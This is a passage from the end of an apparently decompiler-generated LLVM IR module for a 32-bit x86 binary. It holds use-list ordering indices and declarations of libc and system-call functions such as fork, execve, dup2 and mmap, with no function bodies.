778, 23, 98, 90, 779, 192, 128, 780, 91, 781, 705, 706, 707, 222, 708, 405, 782, 264, 783, 784, 785, 786, 787, 788, 789, 790, 129, 406, 791, 792, 793, 794, 130, 795, 407, 131, 191, 265, 132, 408, 409, 410, 223, 796, 797, 798, 799, 224, 208, 209, 800, 801, 802, 803, 804, 805, 411, 225, 806, 133, 412, 807, 134, 226, 227, 808, 809, 413, 810, 811, 812, 813, 85, 899, 900, 901, 902, 92, 193, 135, 228, 99, 814, 194, 414, 415, 416, 815, 136, 816, 505, 904, 735, 736, 737, 266, 738, 506, 905, 104, 229, 520, 739, 906, 475, 474, 907, 908, 909, 476, 910, 507, 472, 911, 912, 913, 693, 914, 137, 915, 926, 927, 24, 108, 417, 25, 418, 419, 933, 937, 195, 938, 138, 357, 267, 268, 932, 6, 916, 917, 918, 139, 473, 373, 140, 420, 521, 7, 230, 231, 141, 522, 523, 142, 143, 525, 524, 526, 527, 269, 358, 528, 530, 529, 531, 919, 920, 144, 421, 925, 553, 554, 555, 556, 422, 423, 557, 254, 424, 232, 145, 146, 425, 477, 426, 478, 147, 427, 148, 428, 532, 62, 533, 534, 535, 8, 429, 733, 270, 479, 480, 481, 482, 430, 149, 928, 359, 150, 233, 929, 931, 930, 742, 743, 744, 745, 746, 234, 747, 748, 749, 271, 740, 272, 741, 273, 431, 432, 274, 360, 433, 275, 361, 151, 434, 750, 751, 152, 153, 276, 362, 106, 752, 753, 754, 154, 155, 277, 363, 105, 755, 196, 756, 93, 757, 758, 760, 435, 759, 654, 436, 235, 655, 437, 656, 657, 658, 660, 661, 662, 663, 664, 665, 666, 667, 668, 566, 567, 26, 158, 236, 63, 156, 157, 10, 11, 237, 934, 936, 159, 611, 578, 160, 161, 817, 818, 107, 819, 162, 438, 820, 197, 821, 64, 659, 238, 239, 163, 822, 823, 824, 669, 670, 671, 672, 164, 709, 65, 439, 710, 440, 712, 711, 198, 441, 442, 713, 715, 714, 199, 443, 673, 716, 508, 825, 826, 827, 828, 829, 830, 831, 832, 833, 165, 444, 834, 240, 835, 836, 837, 838, 839, 27, 28, 445, 210, 211, 840, 841, 842, 843, 29, 844, 845, 846, 30, 446, 847, 31, 32, 166, 447, 848, 849, 850, 853, 851, 852, 33, 42, 66, 854, 855, 856, 857, 255, 858, 859, 167, 860, 168, 861, 448, 200, 862, 169, 863, 449, 864, 865, 867, 868, 869, 870, 871, 872, 170, 450, 451, 171, 873, 874, 452, 875, 876, 877, 878, 879, 453, 880, 881, 241, 454, 242, 882, 883, 884, 885, 886, 887, 34, 67, 68, 69, 455, 888, 172, 456, 889, 364, 890, 891, 173, 457, 94, 40, 86, 866, 201, 921, 922, 202, 924, 923, 70, 278, 458, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 243, 727, 459, 460, 728, 175, 176, 174, 365, 177, 366, 509, 203, 510, 511, 244, 245, 512, 367, 513, 212, 368, 514, 178, 515, 516, 517, 246, 892, 179, 729, 461, 731, 903, 558, 694, 897, 935, 898, 761, 730, 483, 492, 484, 485, 486, 487, 488, 489, 490, 491, 493, 494, 495, 496, 497, 498, 499, 500, 501, 279, 502, 207, 74, 73, 503, 504, 206, 72, 71, 536, 213, 537, 538, 539, 540, 541, 542, 375, 543, 214, 215, 544, 545, 546, 547, 251, 75, 548, 549, 550, 551, 552, 216, 217, 280, 369, 370, 180, 252, 559, 560, 561, 562, 563, 564, 281, 565, 35, 43, 76, 568, 36, 37, 247, 569, 181, 248, 249, 283, 674, 80, 675, 676, 677, 182, 79, 678, 377, 288, 289, 78, 679, 680, 681, 183, 77, 284, 682, 285, 683, 282, 378, 290, 291, 286, 371, 184, 287, 372, 684, 685, 686, 376, 379, 687, 688, 689, 690, 81, 82, 83, 84, 691, 692, 185, 292, 293, 186, 695, 294, 696, 187, 188, 253, 295, 697, 698, 189, 250, 16, 44, 17, 45, 732, 38, 762, 939, 940, 256, 941, 942, 9, 893, 894, 895, 190, 462, 204, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 943, 944, 945, 946, 947, 948, 949, 950 }
  uselistorder i32* @ebx, { 36, 220, 221, 348, 349, 121, 123, 126, 127, 128, 129, 130, 124, 122, 125, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 151, 152, 0, 153, 154, 155, 156, 157, 158, 159, 49, 50, 350, 351, 352, 222, 3, 223, 224, 225, 4, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 353, 354, 355, 356, 160, 161, 295, 296, 453, 454, 6, 164, 162, 163, 165, 170, 166, 167, 171, 172, 173, 5, 175, 174, 1, 176, 177, 178, 179, 180, 181, 7, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 51, 52, 53, 54, 55, 56, 57, 58, 237, 238, 239, 240, 8, 241, 9, 242, 243, 357, 358, 359, 360, 10, 361, 362, 363, 11, 364, 12, 365, 366, 367, 368, 13, 369, 370, 371, 372, 373, 374, 375, 459, 460, 14, 461, 462, 465, 466, 78, 79, 80, 81, 376, 377, 82, 83, 467, 468, 297, 15, 298, 299, 84, 85, 469, 470, 98, 300, 471, 60, 472, 473, 474, 475, 476, 477, 86, 87, 59, 478, 479, 480, 481, 482, 216, 217, 301, 302, 483, 484, 485, 34, 35, 498, 499, 500, 507, 508, 509, 510, 31, 16, 29, 501, 504, 505, 506, 486, 99, 100, 101, 102, 103, 104, 105, 106, 487, 488, 489, 490, 497, 115, 116, 61, 62, 63, 64, 65, 66, 107, 108, 17, 2, 109, 290, 291, 68, 110, 111, 112, 67, 69, 292, 293, 294, 502, 503, 70, 71, 72, 73, 303, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 18, 318, 319, 304, 305, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 32, 331, 332, 333, 334, 335, 19, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 196, 197, 198, 199, 200, 201, 20, 202, 203, 204, 511, 512, 513, 514, 515, 516, 517, 520, 521, 168, 169, 378, 379, 380, 381, 382, 383, 384, 385, 386, 205, 206, 207, 208, 21, 22, 209, 210, 211, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 212, 213, 214, 215, 260, 261, 262, 263, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 423, 424, 23, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 24, 438, 439, 440, 441, 442, 74, 75, 76, 77, 418, 420, 419, 421, 422, 491, 25, 492, 493, 494, 495, 33, 26, 30, 496, 522, 523, 524, 525, 526, 264, 265, 266, 267, 268, 269, 27, 270, 28, 271, 272, 273, 274, 275, 276, 277, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 443, 444, 445, 446, 447, 448, 278, 279, 282, 283, 284, 463, 464, 117, 118, 218, 219, 455, 456, 518, 519, 457, 458, 346, 347, 280, 281, 113, 114, 119, 120, 285, 286, 287, 288, 289, 527, 528, 529, 530, 449, 450, 451, 452 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_6() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_7() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_8() local_unnamed_addr

declare %rusage* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
